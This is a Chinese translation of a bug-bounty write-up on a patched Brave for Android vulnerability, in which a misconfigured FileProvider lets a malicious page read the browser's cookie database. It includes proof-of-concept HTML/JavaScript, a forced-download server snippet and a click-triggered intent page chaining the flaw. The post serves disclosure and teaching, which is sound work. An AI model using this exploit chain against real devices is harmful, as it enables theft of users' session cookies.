<html>
<head>
<title>Brave — Stealing your cookies remotely</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">勇敢——远程偷你的饼干</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/brave-stealing-your-cookies-remotely-1e09d1184675?source=collection_archive---------0-----------------------#2021-04-22">https://infosecwriteups.com/brave-stealing-your-cookies-remotely-1e09d1184675?source=collection_archive---------0-----------------------#2021-04-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/69de8d3d6d12a62fc59641db2a9dccae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hdrObcmOY65HtkveHGq9bg.png"/></div></div></figure><p id="1444" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Brave for Android有一个漏洞，允许恶意网页远程窃取您的cookies。该漏洞是通过HackerOne报告的，修复耗时5个月。</p><h1 id="fd72" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">介绍</h1><p id="bf70" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">在我研究Android应用程序的过程中，我在一些最常用的浏览器中发现了一些漏洞。在研究Brave的时候，我注意到它使用了一个<a class="ae lz" href="https://developer.android.com/reference/android/content/ContentProvider.html" rel="noopener ugc nofollow" target="_blank">内容提供者</a>,这个提供者公开了公共目录中的所有文件以及私有文件。</p><p id="da85" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了处理文件，大多数Android应用程序使用一个<a class="ae lz" href="https://developer.android.com/reference/androidx/core/content/FileProvider" rel="noopener ugc nofollow" target="_blank">文件提供者</a>。这允许使用<code class="fe ma mb mc md b">content://</code>计划的URI访问文件。为了在Android中配置文件提供者，Brave在其<code class="fe ma mb mc md b">AndroidManifest.xml</code>文件中声明了以下内容:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="8fe6" class="mm kx iq md b gy mn mo l mp mq">&lt;provider android:name="org.chromium.chrome.browser.util.ChromeFileProvider" android:exported="false" android:authorities="com.brave.browser.FileProvider" android:grantUriPermissions="true"&gt;<br/>    &lt;meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/&gt;<br/>&lt;/provider&gt;</span></pre><p id="a43d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在它的<code class="fe ma mb mc md b">file_paths.xml</code>中，存储了这个提供者的可用文件信息，Brave有以下内容:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="27b4" class="mm kx iq md b gy mn mo l mp mq">&lt;paths&gt;<br/>    &lt;root-path name="root" path="." /&gt;<br/>    &lt;files-path name="images" path="images/" /&gt;<br/>    &lt;cache-path name="cache" path="net-export/" /&gt;<br/>    &lt;cache-path name="passwords" path="passwords/" /&gt;<br/>    &lt;cache-path name="traces" path="traces/" /&gt;<br/>    &lt;cache-path name="webapk" path="webapks/" /&gt;<br/>    &lt;cache-path name="offline-cache" path="Offline Pages/archives/" /&gt;<br/>    &lt;external-path name="downloads" path="Download/" /&gt;<br/>    &lt;external-path name="downloads" path="Android/data/com.brave.browser/files/Download/" /&gt;<br/>&lt;/paths&gt;</span></pre><p id="34e7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我立刻看到了<code class="fe ma mb mc md b">root</code>文件夹的配置，其中有<code class="fe ma mb mc md b">root-path</code>和<code class="fe ma mb mc md b">.</code>的组合，这意味着主目录<code class="fe ma mb mc md b">/</code>是可用的。这包括<code class="fe ma mb mc md b">/sdcard/</code>以及<code class="fe ma mb mc md b">/data/</code>。</p><p id="cb2d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">大部分浏览器都支持直接阅读<code class="fe ma mb mc md b">content://</code>。例如，这对于打开本地HTML页面或PDF文件非常有用。Brave也支持这一点，所以在Brave中打开一个<code class="fe ma mb mc md b">content://</code> URL将在浏览器中呈现该文件。</p><p id="4e89" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">由于Brave公开了自己的私有文件夹<code class="fe ma mb mc md b">/data/data/com.brave.browser/</code>，我们可以命令Brave打开自己的cookies文件<code class="fe ma mb mc md b">content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies</code>，看看会发生什么:</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/3d499b2264415fd5b5bf5f2214a68986.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/1*Tv6fRI-oVXqOSZi9egTEJg.gif"/></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">Brave从content:// URLs下载二进制文件</figcaption></figure><p id="baf3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它下载文件。这本身就已经是一个漏洞了。这将允许恶意应用程序命令Brave打开该内容URI，等待Brave下载该文件，然后从下载目录中检索该文件，该目录是一个公共目录，所有具有<code class="fe ma mb mc md b">STORAGE</code>权限的应用程序都可以使用。</p><p id="ccba" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这时我通过HackerOne向勇者队报告了漏洞。第二天，我想知道我是否可以通过找到一种从下载中窃取文件的方法，将这个漏洞升级到“远程”。</p><p id="d579" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我注意到<code class="fe ma mb mc md b">content://</code>提供者和<code class="fe ma mb mc md b">iframes</code>之间存在交叉文件保护问题，允许通过<code class="fe ma mb mc md b">content://</code> URI加载的HTML文件从另一个<code class="fe ma mb mc md b">content://</code> URI加载另一个文件，前提是权限相同。</p><p id="1a80" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我决定将这个漏洞与之前的漏洞联系起来，让恶意网页生成一个恶意HTML文件，从设备中窃取cookies。</p><p id="e28a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">恶意网页首先需要触发恶意HTML文件的下载。恶意HTML文件的内容可能是:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="b318" class="mm kx iq md b gy mn mo l mp mq">&lt;script type="text/javascript"&gt;<br/>​<br/>  var request = new XMLHttpRequest();<br/>  request.open("GET", "content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies", true);<br/>  request.send(null);<br/>  request.onreadystatechange = function() {<br/>      if (request.readyState == 4) alert("Sending cookies to attacker: " + request.responseText);<br/>  };<br/>​<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><p id="209e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这将载入<code class="fe ma mb mc md b">content://com.brave.browser.FileProvider/root/data/data/com.brave.browser/app_chrome/Default/Cookies</code>的内容，并以警告模式打印出来。在真实的攻击场景中，内容会被发送到恶意服务器。</p><p id="c7cf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">恶意页面加载后会触发上述文件的下载，该文件会保存在<code class="fe ma mb mc md b">/sdcard/Download/new_file.html</code>下。</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="013f" class="mm kx iq md b gy mn mo l mp mq">self.send_response(200)<br/>self.send_header("Content-Type", "application/octet-stream")<br/>self.send_header("content-disposition", "attachment; filename=new_file.html")<br/>self.end_headers()</span></pre><p id="9ecc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为Brave不允许在你打开一个新页面后，没有用户交互就打开另一个页面，所以我添加了一个点击监听器，当用户点击网页的任何位置时都会触发这个监听器:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="115f" class="mm kx iq md b gy mn mo l mp mq">&lt;iframe src="/download_page.html" style="width:0;height:0;border:0; border:none;"&gt;&lt;/iframe&gt;<br/>​<br/>&lt;button id="myCheck" onclick="window.open('android-app://com.brave.browser/content/com.brave.browser.FileProvider/root/sdcard/Download/new_file.html#Intent;type=text/html;end');"&gt;<br/>​<br/>&lt;script&gt;<br/>  document.addEventListener('click', function (event) {<br/>    document.removeEventListener('click', this, false);<br/>    document.getElementById("myCheck").click();<br/>  }, false);<br/>&lt;/script&gt;<br/>&lt;/html&gt;</span></pre><p id="110b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe ma mb mc md b">iframe</code>将触发恶意HTML文件的下载，然后我创建了监听器来等待点击事件。</p><p id="3f71" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当用户点击屏幕时，恶意HTML将打开并触发漏洞。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/d1c7e985858ad3cbf8ccab98aafc226a.png" data-original-src="https://miro.medium.com/v2/resize:fit:640/1*Xe39AoEXFaiW2jsCvyODkw.gif"/></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">显示cookies数据库内容的完整漏洞</figcaption></figure><h1 id="4f49" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">结论</h1><p id="9796" class="pw-post-body-paragraph jy jz iq ka b kb lu kd ke kf lv kh ki kj lw kl km kn lx kp kq kr ly kt ku kv ij bi translated">尽管这需要用户交互，但点击网页的情况并不少见，用户可能会被许多方式欺骗。第二天，我用这个新的漏洞更新了我的初步报告，将问题的严重性提高到了危急。</p><h1 id="fbde" class="kw kx iq bd ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt bi translated">时间表</h1><ul class=""><li id="4fed" class="mw mx iq ka b kb lu kf lv kj my kn mz kr na kv nb nc nd ne bi translated">2020年5月16日—向HackerOne提交初步报告</li><li id="39ef" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年5月17日—报告远程攻击</li><li id="1d80" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年6月2日—修复开始</li><li id="a793" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年6月16日—部署修复</li><li id="d38c" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年6月18日——奖金分配(500美元)</li><li id="9751" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年8月29日—由于回归，报告重新打开</li><li id="b3a4" class="mw mx iq ka b kb nf kf ng kj nh kn ni kr nj kv nb nc nd ne bi translated">2020年10月23日—修复重新部署</li></ul><p id="b7f0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Brave <a class="ae lz" href="https://github.com/brave/brave-core/pull/5841" rel="noopener ugc nofollow" target="_blank">在v1.12.32 </a>中解决了该问题，大约在最初报告后1个月。然而，由于在v1.13.87中Brave处理本地PDF文件的方式出现倒退，此修复<a class="ae lz" href="https://github.com/brave/brave-core/pull/6530" rel="noopener ugc nofollow" target="_blank">被恢复。最终修复</a><a class="ae lz" href="https://github.com/brave/brave-core/pull/6836" rel="noopener ugc nofollow" target="_blank">在v1.18.5中的初始</a><a class="ae lz" href="https://github.com/brave/brave-core/pull/6836" rel="noopener ugc nofollow" target="_blank">报告</a>5个月后部署。</p><p id="e424" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你可以在这里阅读完整的披露报告<a class="ae lz" href="https://hackerone.com/reports/876192" rel="noopener ugc nofollow" target="_blank">。</a></p><p id="64c4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这篇文章是我2020年在Android浏览器上发现的一系列漏洞的一部分。如果你喜欢这个，你可以在这里阅读我在火狐<a class="ae lz" rel="noopener ugc nofollow" target="_blank" href="/firefox-and-how-a-website-could-steal-all-of-your-cookies-581fe4648e8d">发现的一个类似的漏洞，关于一个网站如何窃取你所有的cookies。请继续关注其他浏览器上的后续报道！</a></p><p id="ceb0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">干杯，</p><p id="243a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">推特</strong> : <a class="ae lz" href="https://twitter.com/kanytu" rel="noopener ugc nofollow" target="_blank"> @kanytu </a></p><p id="0070" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">领英</strong>:<a class="ae lz" href="http://www.linkedin.com/in/kanytu" rel="noopener ugc nofollow" target="_blank">www.linkedin.com/in/kanytu</a></p></div></div>    
</body>
</html>